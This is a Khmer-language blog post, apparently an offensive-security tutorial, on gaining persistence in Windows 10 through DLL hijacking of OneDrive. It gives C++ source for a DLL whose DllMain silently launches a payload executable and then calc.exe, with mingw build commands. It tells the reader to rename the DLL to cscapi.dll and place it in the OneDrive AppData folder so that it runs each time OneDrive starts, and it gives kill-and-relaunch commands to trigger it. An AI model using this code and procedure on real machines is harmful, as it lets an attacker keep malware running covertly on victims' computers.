---
title: "DLL Hijacking - Persistence Method"
date: 2022-12-06T21:01:06+07:00
description: បើក Persistence តាមរយៈវិធីសាស្ត្រ DLL Hijacking
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- dll
- persistence
- hijacking
categories:
- DLL Hijacking
series:
- WinExE
image: images/feature2/article-1.png
---

#### CPP - Execute Command Prompt

ចម្លងកូដ និង កែប្រែទីតាំងរបស់ Payload​ ។
{{< highlight cpp "linenos=table" >}}
#include <windows.h>
#include <unistd.h>
using namespace std;
void exec1() {
	WinExec("cmd.exe /c C:\\programdata\\putty.exe", 0); 
}
void exec2() {
	WinExec("cmd.exe /c calc.exe", 0);
}
BOOL WINAPI
DllMain (HANDLE hDLL, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
		case DLL_PROCESS_ATTACH:
			exec1();
			usleep(5000000); //5sec
			exec2();
		break;
	}
return TRUE;
}
{{< / highlight >}}

<b>យោងតាម៖</b> [dllmain](https://github.com/Amorph/tcc/blob/master/win32/lib/dllmain.c)

#### DLL Build

ចូលទៅកាន់ផ្ទាំង Terminal ក្នុងប្រព័ន្ធប្រតិបត្តិការលីនុច រួចវាយពាក្យបញ្ជាដូខខាងក្រោម៖

{{< highlight cpp "linenos=table" >}}
// To create Windows executables, you need to instsall mingw cross-compiler
sudo apt-get install mingw-w64

//For x64 compile with: 
x86_64-w64-mingw32-gcc r4t.cpp -shared -o output.dll

//For x86 compile with: 
i686-w64-mingw32-gcc r4t.cpp -shared -o output.dll
{{< / highlight >}}

#### Get Persistence In Windows 10

ប្ដូរឈ្មោះ Payload ដែលបានបង្កើតរួច ឲ្យទៅជា <span style="color:red">cscapi.dll</span> បន្ទាប់មកចម្លងឯកសារមេរោគនោះដាក់ចូលទៅកាន់បណ្ដុំនៃឯកសាររបស់ OneDrive ដែលមានទីតាំងដូចខាងក្រោម៖
{{< highlight plain "linenos=table" >}}
C:\Users\[username]\AppData\Local\Microsoft\OneDrive\ 
{{< / highlight >}}

![cscapi.dll](/en/posts/img/2022/12/dll-hijack/cscapi.jpg)

វីធីសាស្ត្រនេះគឺអាចដាក់ Persistence បានដោយប្រើប្រាស់ឯកសារយោងនៃ onedrive.exe ដូចនេះនៅរាល់ពេលដែលកម្មវិធី OneDrive ដែលបានដម្លើងមកស្រាប់ក្នុងវីនដូត្រូវបានបើកនៅក្នុង Start Up នោះវានឹងទៅបើកដំណើរការឯកសារមេរោគផ្ទាល់តែម្ដង។

ពាក្យបញ្ជាទាំងពីរខាងក្រោមនេះសម្រាប់សម្លាប់ Process ដែលកំពុងបើក និងបើកដំណើរការកម្មវិធីឡើងមកវិញ ក្នុងករណីបើអ្នកចង់សាកម្ដងដំណើរការវិធីសាស្ត្រខាងលើភ្លាមៗដោយមិនចាំបាច់ធ្វើការ Restart កុំព្យូទ័រ៕

{{< highlight plain "linenos=table" >}}
//To kill the onedrive procress type
taskkill /im onedrive.exe /f

//Run the file
cmd.exe /c onedrive.exe
{{< / highlight >}}

<b>ឯកសារយោង៖</b> [ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE)
<b>អានផងដែរ៖</b> [ain-kun.medium](https://ain-kun.medium.com/dll-hijacking-onedrive-73f06ce102ce)